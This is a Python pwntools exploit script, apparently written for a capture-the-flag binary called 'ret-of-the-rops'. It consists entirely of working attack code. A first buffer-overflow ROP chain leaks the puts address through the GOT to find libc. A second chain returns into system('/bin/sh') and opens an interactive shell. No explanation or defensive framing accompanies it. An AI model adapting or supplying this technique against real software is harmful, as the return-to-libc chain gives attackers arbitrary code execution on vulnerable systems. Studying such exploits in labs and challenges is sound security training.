#!/usr/bin/python
import sys
import struct
from pwn import *

context.log_level = 'error'

e = ELF("./ret-of-the-rops")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(e.path)
#p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

deadcode = p64(0xdeadc0dedeadc0de)

pop_rdi_ret = p64(0x401263)
puts_plt = p64(0x401030)
puts_got = p64(0x404018)
main_func = p64(0x4011b7)
ret = p64(0x40101a)

# Send first payload (libc leak)
payload = b'A'*40
payload += pop_rdi_ret
payload += puts_got
payload += puts_plt
payload += main_func

# Receive prompt
print(f"Received: {p.recvline()}")

p.sendline(payload)

# Receive the payload which gets echoed back to screen
# This includes my payload and the output of puts
leak_line = p.recvline()

leak_addr = leak_line[-7:-1]

puts_libc = u64(leak_addr.ljust(8,b'\x00'))
print(f'puts_libc: {hex(puts_libc)}')

libc_base = puts_libc - libc.symbols.puts
print(f'libc_base: {hex(libc_base)}')
print()

# Receive prompt again
print(f"Received: {p.recvline()}")

# Payload gets echo'ed back, consume that too

# set libc base
libc.address = libc_base
system = p64(libc.symbols.system)
libc_exit = p64(libc.symbols.exit)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))

payload = b'B'*40
payload += ret
payload += pop_rdi_ret
payload += bin_sh
payload += system
payload += deadcode   # return for system

p.sendline(payload)
p.interactive()
